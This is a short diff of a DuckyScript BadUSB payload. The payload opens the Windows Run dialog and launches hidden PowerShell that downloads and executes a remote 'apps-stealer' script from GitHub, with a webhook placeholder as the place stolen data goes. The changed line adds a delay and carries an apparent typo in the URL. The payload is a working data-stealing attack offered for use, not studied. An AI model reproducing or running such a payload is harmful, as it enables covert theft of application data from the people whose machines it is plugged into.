@@ -4,4 +4,5 @@ REM Author: SuperJakov (https://github.com/SuperJakov)
 
 DELAY 500 
 GUI r 
-STRINGLN powershell -w h $dc="WEBHOOK_HERE";irm "https://raw.githubusercontent.com/SuperJakov/Badusb/main/apps-stealer/apps-stealer.ps1" | iex;
+DELAY 500
+STRINGLN powershell -w h $dc='WEBHOOK_HERE';irm "https://raw.githubusercontent.com/SuperJakov/Badusb/main/apps-stea0ler/apps-stealer.ps1" | iex;
